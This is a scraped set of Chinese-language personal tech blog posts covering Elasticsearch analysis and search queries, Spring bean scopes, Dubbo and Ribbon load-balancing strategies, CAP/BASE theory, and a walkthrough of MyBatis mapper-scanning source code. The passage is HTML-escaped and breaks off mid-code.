Pattern受限，但是效率更高，默认是空字符串。 和Pattern Tokenizer的区别就是使用的是Lucene的正则表达式，没有java强大，但是效率更高。 1234567891011121314151617181920212223242526PUT my-index-000001&#123; &quot;settings&quot;: &#123; &quot;analysis&quot;: &#123; &quot;analyzer&quot;: &#123; &quot;my_analyzer&quot;: &#123; &quot;tokenizer&quot;: &quot;my_tokenizer&quot; &#125; &#125;, &quot;tokenizer&quot;: &#123; &quot;my_tokenizer&quot;: &#123; &quot;type&quot;: &quot;simple_pattern_split&quot;, &quot;pattern&quot;: &quot;_&quot; &#125; &#125; &#125; &#125;&#125;POST my-index-000001/_analyze&#123; &quot;analyzer&quot;: &quot;my_analyzer&quot;, &quot;text&quot;: &quot;an_underscored_phrase&quot;&#125;--- response ---[ an, underscored, phrase ] Standrad Tokenizer基于Unicode的文本切割算法，对很多语言很友好。 参数max_token_length：最大分词长度。 字符过滤（Character Filter）HTML strip character filter对html的标签进行过滤 Mapping character filter映射过滤，比如将a映射成b。 12345678910111213141516171819202122GET /_analyze&#123; &quot;tokenizer&quot;: &quot;keyword&quot;, &quot;char_filter&quot;: [ &#123; &quot;type&quot;: &quot;mapping&quot;, &quot;mappings&quot;: [ &quot;٠ =&gt; 0&quot;, &quot;١ =&gt; 1&quot;, &quot;٢ =&gt; 2&quot;, &quot;٣ =&gt; 3&quot;, &quot;٤ =&gt; 4&quot;, &quot;٥ =&gt; 5&quot;, &quot;٦ =&gt; 6&quot;, &quot;٧ =&gt; 7&quot;, &quot;٨ =&gt; 8&quot;, &quot;٩ =&gt; 9&quot; ] &#125; ], &quot;text&quot;: &quot;My license plate is ٢٥٠١٥&quot;&#125; Pattern replace character filter正则替换 Normalizersnormalizers和tokenizer的区别就是他只针对单个词。 基础查询简单查询查询my-index-000001索引里面的user.id为kimchy的数据。 12345678GET /my-index-000001/_search&#123; &quot;query&quot;: &#123; &quot;match&quot;: &#123; &quot;user.id&quot;: &quot;kimchy&quot; &#125; &#125;&#125; 会返回以下结果 1234567891011121314151617181920212223242526272829303132333435363738394041424344&#123; &quot;took&quot;: 5, &quot;timed_out&quot;: false, &quot;_shards&quot;: &#123; &quot;total&quot;: 1, &quot;successful&quot;: 1, &quot;skipped&quot;: 0, &quot;failed&quot;: 0 &#125;, &quot;hits&quot;: &#123; &quot;total&quot;: &#123; &quot;value&quot;: 1, &quot;relation&quot;: &quot;eq&quot; &#125;, &quot;max_score&quot;: 1.3862942, &quot;hits&quot;: [ &#123; &quot;_index&quot;: &quot;my-index-000001&quot;, &quot;_id&quot;: &quot;kxWFcnMByiguvud1Z8vC&quot;, &quot;_score&quot;: 1.3862942, &quot;_source&quot;: &#123; &quot;@timestamp&quot;: &quot;2099-11-15T14:12:12&quot;, &quot;http&quot;: &#123; &quot;request&quot;: &#123; &quot;method&quot;: &quot;get&quot; &#125;, &quot;response&quot;: &#123; &quot;bytes&quot;: 1070000, &quot;status_code&quot;: 200 &#125;, &quot;version&quot;: &quot;1.1&quot; &#125;, &quot;message&quot;: &quot;GET /search HTTP/1.1 200 1070000&quot;, &quot;source&quot;: &#123; &quot;ip&quot;: &quot;127.0.0.1&quot; &#125;, &quot;user&quot;: &#123; &quot;id&quot;: &quot;kimchy&quot; &#125; &#125; &#125; ] &#125;&#125; took：此次查询的耗时，单位毫秒。 计算的是协调节点收到请求到协调节点准备响应之间的时间。 took time包括： 1、协调节点和数据节点的通信时间。 2、请求在搜索线程池花费的时间以及排队等待执行的时间。 3、真实执行的时间。 不包括： 1、发送请求到es的时间。 2、序列化响应的时间。 3、发送响应到客户端的时间。 timed_out 如果超时会为ture，超时可能返回部分结果或者空。 _shards 此次请求的分片情况。 total 需要查询的分片数量，包括未分配的分片。 successful 执行请求成功的分片数量。 skipped 填过请求的分片数量，有个轻量级的检查帮忙识别索要查询的文档是不是在这个分片里面，这通常发生在范围查找， failed 执行请求失败的分片数量，一些分片没有被分配可能会引起failed + successful &lt; total的情况。 hits 包括返回的文档和元数据信息。 total value 返回的文档数量。 relation 关系 eq、 gte。 max_score 文档返回的最高分数，如果不按照_score排序为null。 hits _index 文档所在的索引名。 _id 返回文档的统一标识符。 _score 得分。 _source 具体的数据，json格式的。 排序简单排序可以通过一个或多个字段来排序，也可以有特殊字段如_score排序得分，_doc排序索引。 创建一个索引。 123456789101112131415PUT /my-index-000001&#123; &quot;mappings&quot;: &#123; &quot;properties&quot;: &#123; &quot;post_date&quot;: &#123; &quot;type&quot;: &quot;date&quot; &#125;, &quot;user&quot;: &#123; &quot;type&quot;: &quot;keyword&quot; &#125;, &quot;name&quot;: &#123; &quot;type&quot;: &quot;keyword&quot; &#125;, &quot;age&quot;: &#123; &quot;type&quot;: &quot;integer&quot; &#125; &#125; &#125;&#125; format：对排序字段进行处理。 asc：升序 desc：降序 12345678910111213GET /my-index-000001/_search&#123; &quot;sort&quot; : [ &#123; &quot;post_date&quot; : &#123;&quot;order&quot; : &quot;asc&quot;, &quot;format&quot;: &quot;strict_date_optional_time_nanos&quot;&#125;&#125;, &quot;user&quot;, &#123; &quot;name&quot; : &quot;desc&quot; &#125;, &#123; &quot;age&quot; : &quot;desc&quot; &#125;, &quot;_score&quot; ], &quot;query&quot; : &#123; &quot;term&quot; : &#123; &quot;user&quot; : &quot;kimchy&quot; &#125; &#125;&#125; mode选项使用mode支持对array的排序，支持min、max、sum、avg、median操作，排序为asc的时候mode默认为min，排序为desc的时候mode默认为max。 123456789101112131415PUT /my-index-000001/_doc/1?refresh&#123; &quot;product&quot;: &quot;chocolate&quot;, &quot;price&quot;: [20, 4]&#125;POST /_search&#123; &quot;query&quot; : &#123; &quot;term&quot; : &#123; &quot;product&quot; : &quot;chocolate&quot; &#125; &#125;, &quot;sort&quot; : [ &#123;&quot;price&quot; : &#123;&quot;order&quot; : &quot;asc&quot;, &quot;mode&quot; : &quot;avg&quot;&#125;&#125; ]&#125; numeric_type两个索引查询的时候用于统一排序字段类型。 12345678910111213141516171819202122232425262728PUT /index_double&#123; &quot;mappings&quot;: &#123; &quot;properties&quot;: &#123; &quot;field&quot;: &#123; &quot;type&quot;: &quot;double&quot; &#125; &#125; &#125;&#125;PUT /index_long&#123; &quot;mappings&quot;: &#123; &quot;properties&quot;: &#123; &quot;field&quot;: &#123; &quot;type&quot;: &quot;long&quot; &#125; &#125; &#125;&#125;POST /index_long,index_double/_search&#123; &quot;sort&quot; : [ &#123; &quot;field&quot; : &#123; &quot;numeric_type&quot; : &quot;double&quot; &#125; &#125; ]&#125; Missing values可以将missing参数设置成_last或者_first，不设置默认为_last。 分页es默认返回10个数据，可以用from和size来进行分页。 12345678910GET /_search&#123; &quot;from&quot;: 5, &quot;size&quot;: 20, &quot;query&quot;: &#123; &quot;match&quot;: &#123; &quot;user.id&quot;: &quot;kimchy&quot; &#125; &#125;&#125; 返回对应的字段field字段field字段既包含文档数据又包含索引映射。 1234567891011121314151617POST my-index-000001/_search&#123; &quot;query&quot;: &#123; &quot;match&quot;: &#123; &quot;user.id&quot;: &quot;kimchy&quot; &#125; &#125;, &quot;fields&quot;: [ &quot;user.id&quot;, &quot;http.response.*&quot;, &#123; &quot;field&quot;: &quot;@timestamp&quot;, &quot;format&quot;: &quot;epoch_millis&quot; &#125; ], &quot;_source&quot;: false&#125; _source字段_source指定为false，表示没有source字段返回。 _source可以支持正则。 _source可以支持数组+正则。 _source支持includes和excludes。 123456789101112GET /_search&#123; &quot;_source&quot;: &#123; &quot;includes&quot;: [ &quot;obj1.*&quot;, &quot;obj2.*&quot; ], &quot;excludes&quot;: [ &quot;*.description&quot; ] &#125;, &quot;query&quot;: &#123; &quot;term&quot;: &#123; &quot;user.id&quot;: &quot;kimchy&quot; &#125; &#125;&#125; 从多个索引中搜索。 123456789101112131415161718GET /my-index-000001,my-index-000002/_search&#123; &quot;query&quot;: &#123; &quot;match&quot;: &#123; &quot;user.id&quot;: &quot;kimchy&quot; &#125; &#125;&#125;GET /my-index-*/_search&#123; &quot;query&quot;: &#123; &quot;match&quot;: &#123; &quot;user.id&quot;: &quot;kimchy&quot; &#125; &#125;&#125; index_boost用来在多个索引搜索中提高部分索引的重要性。 1234567GET /_search&#123; &quot;indices_boost&quot;: [ &#123; &quot;my-alias&quot;: 1.4 &#125;, &#123; &quot;my-index*&quot;: 1.3 &#125; ]&#125; 高亮12345678910111213GET /_search&#123; &quot;query&quot; : &#123; &quot;match&quot;: &#123; &quot;user.id&quot;: &quot;kimchy&quot; &#125; &#125;, &quot;highlight&quot; : &#123; &quot;pre_tags&quot; : [&quot;&lt;tag1&gt;&quot;, &quot;&lt;tag2&gt;&quot;], &quot;post_tags&quot; : [&quot;&lt;/tag1&gt;&quot;, &quot;&lt;/tag2&gt;&quot;], &quot;fields&quot; : &#123; &quot;body&quot; : &#123;&#125; &#125; &#125;&#125; 近实时搜索当一个文档被存储在es里面的时候，它被建立索引和完全搜索是近实时性的，大概一分钟。 es基于有着按段搜索概念的Lucene，段类似于倒排索引。当提交一个文档后，一个新的段会被提交到提交点，然后缓存被清除。 位于es和磁盘之间的是文件系统缓存，内存缓冲区的文档会被写到一个新的段里面，这个新段首先会被写入到系统文件缓存里面（代价小），稍后会被刷新到磁盘（代价昂贵）。 在es里面，写入和打开一个新段的操作交作refresh，refresh可以使自从上次refresh之后的对于index的操作可以被搜索。","categories":[{"name":"Elasticsearch","slug":"Elasticsearch","permalink":"http://fireflyingup.github.io/categories/Elasticsearch/"}],"tags":[{"name":"Elasticsearch","slug":"Elasticsearch","permalink":"http://fireflyingup.github.io/tags/Elasticsearch/"}]},{"title":"","slug":"spring","date":"2024-02-26T02:07:52.803Z","updated":"2024-02-26T02:08:18.472Z","comments":true,"path":"2024/02/26/spring/","link":"","permalink":"http://fireflyingup.github.io/2024/02/26/spring/","excerpt":"","text":"Spring的生命周期Spring 提供了多种不同的作用域（scope），它们决定了 Bean 的生命周期。 singleton：单例作用域，在整个应用中只有一个实例，该实例在 Spring 容器初始化时创建。 prototype：原型作用域，每次调用都会创建一个新的实例，而不是使用单例。 request：请求作用域，当前 HTTP 请求的生命周期内有效。 session：会话作用域，整个 HTTP 会话的生命周期内有效。 global session：全局会话作用域，在 Portlet 应用程序中有效，对于全局 HTTP 会话的生命周期内有效。","categories":[],"tags":[]},{"title":"dubbo","slug":"dubbo","date":"2023-12-28T02:09:01.000Z","updated":"2023-12-28T03:01:18.808Z","comments":true,"path":"2023/12/28/dubbo/","link":"","permalink":"http://fireflyingup.github.io/2023/12/28/dubbo/","excerpt":"","text":"Dubbo负载均衡策略 RandomLoadBalance:随机负载均衡。随机的选择一个。是Dubbo的默认负载均衡策略。 RoundRobinLoadBalance:轮询负载均衡。轮询选择一个。 LeastActiveLoadBalance:最少活跃调用数，相同活跃数的随机。活跃数指调用前后计数差。使慢的 Provider 收到更少请求，因为越慢的 Provider 的调用前后计数差会越大。 ConsistentHashLoadBalance:一致性哈希负载均衡。相同参数的请求总是落在同一台机器上。","categories":[{"name":"dubbo","slug":"dubbo","permalink":"http://fireflyingup.github.io/categories/dubbo/"}],"tags":[{"name":"dubbo","slug":"dubbo","permalink":"http://fireflyingup.github.io/tags/dubbo/"}]},{"title":"cloud","slug":"cloud","date":"2023-12-28T02:09:01.000Z","updated":"2024-03-12T06:12:51.493Z","comments":true,"path":"2023/12/28/cloud/","link":"","permalink":"http://fireflyingup.github.io/2023/12/28/cloud/","excerpt":"","text":"Cloud分布式系统的基本理论CAP理论CAP定理：一个分布式系统最多只能同时满足一致性（Consistence）、可用性（Availability）和分区容错性（Partition tolerance）这三项中的两项。 一致性：所有节点在同一时间的看到的数据相同。 可用性：读、写永远都能成功，即，服务一直可用。 分区容错性：即使系统的某个分区遇到严重的故障，系统能继续提供服务。 根据CAP定理，我们无法同时满足一致性、可用性、分区容错性这三个特性。那么，要舍弃哪个呢？ 对于多数大型互联网应用的场景，主机众多、部署分散，节点故障、网络故障是常态，必须保证P；应用的目的是提供服务，因此通常也要保证A。既然要保证P和A，就只能不同程度的舍弃C，牺牲一些用户体验。严格来讲，部分应用的A也不必保证100%，因此，主流做法是首要保障P、在A和C之间取舍、重A轻C。 但是，对于金融服务，必须保证C；大规模金融服务几乎必然涉及网络分区，所以也要保证P；为了保证C、P，只能牺牲A（停止服务）。对于某些特殊的金融服务，需要7*24小时提供服务，则改为牺牲部分P（如单节点主从备份，故障切换），保障C、A。 BASE定律BASE定理是对CAP定理的延伸：即使无法做到强一致性（Strong Consistency），但应用可以采用适合的方式达到最终一致性（Eventual Consitency）。CAP中提到的一致性是强一致性，所谓“牺牲一致性”指牺牲强一致性保证弱一致性。 BASE是指基本可用（Basically Available）、软状态（ Soft State）、最终一致性（ Eventual Consistency）。 基本可用：出现故障的时候，允许损失部分可用性，即，保证核心可用。 如，电商大促时，为了应对访问量激增，部分用户可能会被引导到降级页面，服务层也可能只提供降级服务 软状态：允许系统存在中间状态，而该中间状态不会影响系统整体可用性。 软状态本质上是一种弱一致性，允许的软状态不能违背“基本可用”的要求。如，分布式存储中一般一份数据至少会有三个副本，允许不同节点间副本同步的延时（某些时刻副本数低于3）。 最终一致性：系统中的所有数据副本经过一定时间后，最终能够达到一致的状态。 软状态的终极目标是最终一致性。如，分布式存储的副本数最终会达到稳定状态。 负载均衡策略1.轮询策略轮询策略：RoundRobinRule，按照一定的顺序依次调用服务实例。比如一共有 3 个服务，第一次调用服务 1，第二次调用服务 2，第三次调用服务3，依次类推。 此策略的配置设置如下： 123springcloud-nacos-provider: # nacos中的服务id ribbon: NFLoadBalancerRuleClassName: com.netflix.loadbalancer.RoundRobinRule #设置负载均衡 2.权重策略权重策略：WeightedResponseTimeRule，根据每个服务提供者的响应时间分配一个权重，响应时间越长，权重越小，被选中的可能性也就越低。 它的实现原理是，刚开始使用轮询策略并开启一个计时器，每一段时间收集一次所有服务提供者的平均响应时间，然后再给每个服务提供者附上一个权重，权重越高被选中的概率也越大。 此策略的配置设置如下： 123springcloud-nacos-provider: # nacos中的服务id ribbon: NFLoadBalancerRuleClassName: com.netflix.loadbalancer.WeightedResponseTimeRule 3.随机策略随机策略：RandomRule，从服务提供者的列表中随机选择一个服务实例。 此策略的配置设置如下： 123springcloud-nacos-provider: # nacos中的服务id ribbon: NFLoadBalancerRuleClassName: com.netflix.loadbalancer.RandomRule #设置负载均衡 4.最小连接数策略最小连接数策略：BestAvailableRule，也叫最小并发数策略，它是遍历服务提供者列表，选取连接数最小的⼀个服务实例。如果有相同的最小连接数，那么会调用轮询策略进行选取。 此策略的配置设置如下： 123springcloud-nacos-provider: # nacos中的服务id ribbon: NFLoadBalancerRuleClassName: com.netflix.loadbalancer.BestAvailableRule #设置负载均衡 5.重试策略重试策略：RetryRule，按照轮询策略来获取服务，如果获取的服务实例为 null 或已经失效，则在指定的时间之内不断地进行重试来获取服务，如果超过指定时间依然没获取到服务实例则返回 null。 此策略的配置设置如下： 123456ribbon: ConnectTimeout: 2000 # 请求连接的超时时间 ReadTimeout: 5000 # 请求处理的超时时间springcloud-nacos-provider: # nacos 中的服务 id ribbon: NFLoadBalancerRuleClassName: com.netflix.loadbalancer.RandomRule #设置负载均衡 6.可用性敏感策略可用敏感性策略：AvailabilityFilteringRule，先过滤掉非健康的服务实例，然后再选择连接数较小的服务实例。 此策略的配置设置如下： 123springcloud-nacos-provider: # nacos中的服务id ribbon: NFLoadBalancerRuleClassName: com.netflix.loadbalancer.AvailabilityFilteringRule 7.区域敏感策略区域敏感策略：ZoneAvoidanceRule，根据服务所在区域（zone）的性能和服务的可用性来选择服务实例，在没有区域的环境下，该策略和轮询策略类似。 此策略的配置设置如下： 123springcloud-nacos-provider: # nacos中的服务id ribbon: NFLoadBalancerRuleClassName: com.netflix.loadbalancer.ZoneAvoidanceRule 参考链接CAP和BASE理论","categories":[{"name":"cloud","slug":"cloud","permalink":"http://fireflyingup.github.io/categories/cloud/"}],"tags":[{"name":"cloud","slug":"cloud","permalink":"http://fireflyingup.github.io/tags/cloud/"}]},{"title":"mybatis","slug":"mybatis","date":"2023-10-20T15:10:04.000Z","updated":"2024-03-05T08:08:32.811Z","comments":true,"path":"2023/10/20/mybatis/","link":"","permalink":"http://fireflyingup.github.io/2023/10/20/mybatis/","excerpt":"","text":"MyBatisMyBatis的作用MyBatis 是一流的持久性框架，支持自定义 SQL、存储过程和高级映射。 MyBatis 消除了几乎所有的 JDBC 代码以及手动设置参数和检索结果。 MyBatis 可以使用简单的 XML 或注释进行配置，并将原语、Map 接口和 Java POJO（普通旧 Java 对象）映射到数据库记录。 源码解析MapperScan注解首先使用springboot的时候都需要在启动类上面写这个注解，并且标注basePackages是扫描的包前缀，通过这个basePackages，Mybatis会实现自己的代理类。 123456@Retention(RetentionPolicy.RUNTIME)@Target(&#123;ElementType.TYPE&#125;)@Documented@Import(&#123;MapperScannerRegistrar.class&#125;)@Repeatable(MapperScans.class)public @interface MapperScan &#123;&#125; 这个MapperScan注解上面有个@Import，表示这里面的类先去初始化，那我们深入MapperScannerRegistrar这个类。 MapperScannerRegistrar1public class MapperScannerRegistrar implements ImportBeanDefinitionRegistrar, ResourceLoaderAware &#123;&#125; 首先MapperScannerRegistrar实现了ImportBeanDefinitionRegistrar和ResourceLoaderAware两个接口类，ResourceLoaderAware的这个接口类有个setResourceLoader(ResourceLoader resourceLoader)的接口，但是MapperScannerRegistrar里面并没有实现，并且已经被@Deprecated弃用了。 12345@Override @Deprecated public void setResourceLoader(ResourceLoader resourceLoader) &#123; // NOP &#125; 主要就是ImportBeanDefinitionRegistrar这个接口类的实现了，我们看一下他的registerBeanDefinitions实现，主要是针对MapperScannerConfigurer类生成了一个Bean的定义，然后加入@MapperScan注解里面参数的值，并使用BeanDefinitionRegistry的registerBeanDefinition注册到容器里面。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586@Overridepublic void registerBeanDefinitions(AnnotationMetadata importingClassMetadata, BeanDefinitionRegistry registry) &#123; AnnotationAttributes mapperScanAttrs = AnnotationAttributes .fromMap(importingClassMetadata.getAnnotationAttributes(MapperScan.class.getName())); if (mapperScanAttrs != null) &#123; registerBeanDefinitions(importingClassMetadata, mapperScanAttrs, registry, generateBaseBeanName(importingClassMetadata, 0)); &#125;&#125;void registerBeanDefinitions(AnnotationMetadata annoMeta, AnnotationAttributes annoAttrs, BeanDefinitionRegistry registry, String beanName) &#123;// 通过MapperScannerConfigurer类生成Bean定义构造器 BeanDefinitionBuilder builder = BeanDefinitionBuilder.genericBeanDefinition(MapperScannerConfigurer.class); // 下面都是在@MapperScan注解里面拿属性值塞到BeanDefinitionBuilder里面 builder.addPropertyValue(&quot;processPropertyPlaceHolders&quot;, annoAttrs.getBoolean(&quot;processPropertyPlaceHolders&quot;)); Class&lt;? extends Annotation&gt; annotationClass = annoAttrs.getClass(&quot;annotationClass&quot;); if (!Annotation.class.equals(annotationClass)) &#123; builder.addPropertyValue(&quot;annotationClass&quot;, annotationClass); &#125; Class&lt;?&gt; markerInterface = annoAttrs.getClass(&quot;markerInterface&quot;); if (!Class.class.equals(markerInterface)) &#123; builder.addPropertyValue(&quot;markerInterface&quot;, markerInterface); &#125; Class&lt;? extends BeanNameGenerator&gt; generatorClass = annoAttrs.getClass(&quot;nameGenerator&quot;); if (!BeanNameGenerator.class.equals(generatorClass)) &#123; builder.addPropertyValue(&quot;nameGenerator&quot;, BeanUtils.instantiateClass(generatorClass)); &#125; Class&lt;? extends MapperFactoryBean&gt; mapperFactoryBeanClass = annoAttrs.getClass(&quot;factoryBean&quot;); if (!MapperFactoryBean.class.equals(mapperFactoryBeanClass)) &#123; builder.addPropertyValue(&quot;mapperFactoryBeanClass&quot;, mapperFactoryBeanClass); &#125; String sqlSessionTemplateRef = annoAttrs.getString(&quot;sqlSessionTemplateRef&quot;); if (StringUtils.hasText(sqlSessionTemplateRef)) &#123; builder.addPropertyValue(&quot;sqlSessionTemplateBeanName&quot;, annoAttrs.getString(&quot;sqlSessionTemplateRef&quot;)); &#125; String sqlSessionFactoryRef = annoAttrs.getString(&quot;sqlSessionFactoryRef&quot;); if (StringUtils.hasText(sqlSessionFactoryRef)) &#123; builder.addPropertyValue(&quot;sqlSessionFactoryBeanName&quot;, annoAttrs.getString(&quot;sqlSessionFactoryRef&quot;)); &#125; List&lt;String&gt; basePackages = new ArrayList&lt;&gt;(); basePackages.addAll(Arrays.stream(annoAttrs.getStringArray(&quot;basePackages&quot;)).filter(StringUtils::hasText) .collect(Collectors.toList())); basePackages.addAll(Arrays.stream(annoAttrs.getClassArray(&quot;basePackageClasses&quot;)).map(ClassUtils::getPackageName) .collect(Collectors.toList()));// 如果没有指定basePackage和basepackageClasses，那么就默认扫描@MapperScan注解这个类的文件夹下面。 if (basePackages.isEmpty()) &#123; basePackages.add(getDefaultBasePackage(annoMeta)); &#125; String lazyInitialization = annoAttrs.getString(&quot;lazyInitialization&quot;); if (StringUtils.hasText(lazyInitialization)) &#123; builder.addPropertyValue(&quot;lazyInitialization&quot;, lazyInitialization); &#125; String defaultScope = annoAttrs.getString(&quot;defaultScope&quot;); if (!AbstractBeanDefinition.SCOPE_DEFAULT.equals(defaultScope)) &#123; builder.addPropertyValue(&quot;defaultScope&quot;, defaultScope); &#125; builder.addPropertyValue(&quot;basePackage&quot;, StringUtils.collectionToCommaDelimitedString(basePackages)); // for spring-native builder.setRole(BeanDefinition.ROLE_INFRASTRUCTURE); // 这里去注册这个bean到容器里面 registry.registerBeanDefinition(beanName, builder.getBeanDefinition());&#125;private static String generateBaseBeanName(AnnotationMetadata importingClassMetadata, int index) &#123; return importingClassMetadata.getClassName() + &quot;#&quot; + MapperScannerRegistrar.class.getSimpleName() + &quot;#&quot; + index;&#125;private static String getDefaultBasePackage(AnnotationMetadata importingClassMetadata) &#123; return ClassUtils.getPackageName(importingClassMetadata.getClassName());&#125; 既然注册了MapperScannerConfigurer这个bean，那我们去看看这个类的情况。 MapperScannerConfigurer首先我们看一下类的定义 12public class MapperScannerConfigurer implements BeanDefinitionRegistryPostProcessor, InitializingBean, ApplicationContextAware, BeanNameAware 可以看到实现了四个接口，都是spring提供的接口。 BeanNameAware的setBeanName()方法和ApplicationContextAware的setApplicationContext()方法分别传入了上下文和bean名称，InitializingBean的afterPropertiesSet方法主要对basePackage进行了一个判空处理。 1234567891011121314151617 @Override public void setApplicationContext(ApplicationContext applicationContext) &#123; this.applicationContext = applicationContext; &#125; /** * &#123;@inheritDoc&#125; */ @Override public void setBeanName(String name) &#123; this.beanName = name; &#125;@Override public void afterPropertiesSet() throws Exception &#123; notNull(this.basePackage, &quot;Property &#x27;basePackage&#x27; is required&quot;); &#125; 主要的是BeanDefinitionRegistryPostProcessor的postProcessBeanDefinitionRegistry方法，里面定义了一个ClassPathMapperScanner类，最后调用了他的scan()方法。 ClassPathMapperScanner123456789101112131415161718192021222324252627@Overridepublic void postProcessBeanDefinitionRegistry(BeanDefinitionRegistry registry) &#123; if (this.processPropertyPlaceHolders) &#123; processPropertyPlaceHolders(); &#125; ClassPathMapperScanner scanner = new ClassPathMapperScanner(registry); scanner.setAddToConfig(this.addToConfig); scanner.setAnnotationClass(this.annotationClass); scanner.setMarkerInterface(this.markerInterface); scanner.setSqlSessionFactory(this.sqlSessionFactory); scanner.setSqlSessionTemplate(this.sqlSessionTemplate); scanner.setSqlSessionFactoryBeanName(this.sqlSessionFactoryBeanName); scanner.setSqlSessionTemplateBeanName(this.sqlSessionTemplateBeanName); scanner.setResourceLoader(this.applicationContext); scanner.setBeanNameGenerator(this.nameGenerator); scanner.setMapperFactoryBeanClass(this.mapperFactoryBeanClass); if (StringUtils.hasText(lazyInitialization)) &#123; scanner.setLazyInitialization(Boolean.valueOf(lazyInitialization)); &#125; if (StringUtils.hasText(defaultScope)) &#123; scanner.setDefaultScope(defaultScope); &#125; scanner.registerFilters(); scanner.scan( StringUtils.tokenizeToStringArray(this.basePackage, ConfigurableApplicationContext.CONFIG_LOCATION_DELIMITERS));&#125; scan方法最后会调用doScan方法，而ClassPathMapperScanner对ClassPathBeanDefinitionScanner的doScan方法进行了重写。 123456789101112131415@Overridepublic Set&lt;BeanDefinitionHolder&gt; doScan(String... basePackages) &#123; Set&lt;BeanDefinitionHolder&gt; beanDefinitions = super.doScan(basePackages); if (beanDefinitions.isEmpty()) &#123; if (printWarnLogIfNotFoundMappers) &#123; LOGGER.warn(() -&gt; &quot;No MyBatis mapper was found in &#x27;&quot; + Arrays.toString(basePackages) + &quot;&#x27; package. Please check your configuration.&quot;); &#125; &#125; else &#123; processBeanDefinitions(beanDefinitions); &#125; return beanDefinitions;&#125; doScan方法里面的processBeanDefinitions(beanDefinitions) 主要对basePackages下面扫描出来的beanDefinition进行了重新定义，最主要的是definition.setBeanClass(this.mapperFactoryBeanClass)，将bean的class设置为MapperFactoryBean.class，将bean之前的className放入mapperInterface这个参数里面，MapperFactoryBean继承了SqlSessionDaoSupport方法，并实现了FactoryBean接口。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103@Overridepublic Set&lt;BeanDefinitionHolder&gt; doScan(String... basePackages) &#123; Set&lt;BeanDefinitionHolder&gt; beanDefinitions = super.doScan(basePackages); if (beanDefinitions.isEmpty()) &#123; if (printWarnLogIfNotFoundMappers) &#123; LOGGER.warn(() -&gt; &quot;No MyBatis mapper was found in &#x27;&quot; + Arrays.toString(basePackages) + &quot;&#x27; package. Please check your configuration.&quot;); &#125; &#125; else &#123; processBeanDefinitions(beanDefinitions); &#125; return beanDefinitions;&#125;private void processBeanDefinitions(Set&lt;BeanDefinitionHolder&gt; beanDefinitions) &#123; AbstractBeanDefinition definition; BeanDefinitionRegistry registry = getRegistry(); for (BeanDefinitionHolder holder : beanDefinitions) &#123; definition = (AbstractBeanDefinition) holder.getBeanDefinition(); boolean scopedProxy = false; if (ScopedProxyFactoryBean.class.getName().equals(definition.getBeanClassName())) &#123; definition = (AbstractBeanDefinition) Optional .ofNullable(((RootBeanDefinition) definition).getDecoratedDefinition()) .map(BeanDefinitionHolder::getBeanDefinition).orElseThrow(() -&gt; new IllegalStateException( &quot;The target bean definition of scoped proxy bean not found. Root bean definition[&quot; + holder + &quot;]&quot;)); scopedProxy = true; &#125; String beanClassName = definition.getBeanClassName(); LOGGER.debug(() -&gt; &quot;Creating MapperFactoryBean with name &#x27;&quot; + holder.getBeanName() + &quot;&#x27; and &#x27;&quot; + beanClassName + &quot;&#x27; mapperInterface&quot;); // the mapper interface is the original class of the bean // but, the actual class of the bean is MapperFactoryBean definition.getConstructorArgumentValues().addGenericArgumentValue(beanClassName); // issue #59 try &#123; Class&lt;?&gt; beanClass = Resources.classForName(beanClassName); // Attribute for MockitoPostProcessor // https://github.com/mybatis/spring-boot-starter/issues/475 definition.setAttribute(FACTORY_BEAN_OBJECT_TYPE, beanClass); // for spring-native definition.getPropertyValues().add(&quot;mapperInterface&quot;, beanClass); &#125; catch (ClassNotFoundException ignore) &#123; // ignore &#125; definition.setBeanClass(this.mapperFactoryBeanClass); definition.getPropertyValues().add(&quot;addToConfig&quot;, this.addToConfig); boolean explicitFactoryUsed = false; if (StringUtils.hasText(this.sqlSessionFactoryBeanName)) &#123; definition.getPropertyValues().add(&quot;sqlSessionFactory&quot;, new RuntimeBeanReference(this.sqlSessionFactoryBeanName)); explicitFactoryUsed = true; &#125; else if (this.sqlSessionFactory != null) &#123; definition.getPropertyValues().add(&quot;sqlSessionFactory&quot;, this.sqlSessionFactory); explicitFactoryUsed = true; &#125; if (StringUtils.hasText(this.sqlSessionTemplateBeanName)) &#123; if (explicitFactoryUsed) &#123; LOGGER.warn( () -&gt; &quot;Cannot use both: sqlSessionTemplate and sqlSessionFactory together. sqlSessionFactory is ignored.&quot;); &#125; definition.getPropertyValues().add(&quot;sqlSessionTemplate&quot;, new RuntimeBeanReference(this.sqlSessionTemplateBeanName)); explicitFactoryUsed = true; &#125; else if (this.sqlSessionTemplate != null) &#123; if (explicitFactoryUsed) &#123; LOGGER.warn( () -&gt; &quot;Cannot use both: sqlSessionTemplate and sqlSessionFactory together. sqlSessionFactory is ignored.&quot;); &#125; definition.getPropertyValues().add(&quot;sqlSessionTemplate&quot;, this.sqlSessionTemplate); explicitFactoryUsed = true; &#125; if (!explicitFactoryUsed) &#123; LOGGER.debug(() -&gt; &quot;Enabling autowire by type for MapperFactoryBean with name &#x27;&quot; + holder.getBeanName() + &quot;&#x27;.&quot;); definition.setAutowireMode(AbstractBeanDefinition.AUTOWIRE_BY_TYPE); &#125; definition.setLazyInit(lazyInitialization); if (scopedProxy) &#123; continue; &#125; if (ConfigurableBeanFactory.SCOPE_SINGLETON.equals(definition.getScope()) &amp;&amp; defaultScope != null) &#123; definition.setScope(defaultScope); &#125; if (!definition.isSingleton()) &#123; BeanDefinitionHolder proxyHolder = ScopedProxyUtils.createScopedProxy(holder, registry, true); if (registry.containsBeanDefinition(proxyHolder.getBeanName())) &#123; registry.removeBeanDefinition(proxyHolder.getBeanName()); &#125; registry.registerBeanDefinition(proxyHolder.getBeanName(), proxyHolder.getBeanDefinition()); &#125; &#125;&#125; MapperFactoryBeanMapperFactoryBean继承SqlSessionDaoSupport继承DaoSupport实现了InitializingBean接口，所以bean初始化的时候afterPropertiesSet会被执行，会去执行checkDaoConfig()方法。 123456789public final void afterPropertiesSet() throws IllegalArgumentException, BeanInitializationException &#123; this.checkDaoConfig(); try &#123; this.initDao(); &#125; catch (Exception var2) &#123; throw new BeanInitializationException(&quot;Initialization of DAO failed&quot;, var2); &#125;&#125; 让我们一起看看checkDaoConfig方法 123456789101112131415161718@Overrideprotected void checkDaoConfig() &#123; super.checkDaoConfig(); notNull(this.mapperInterface, &quot;Property 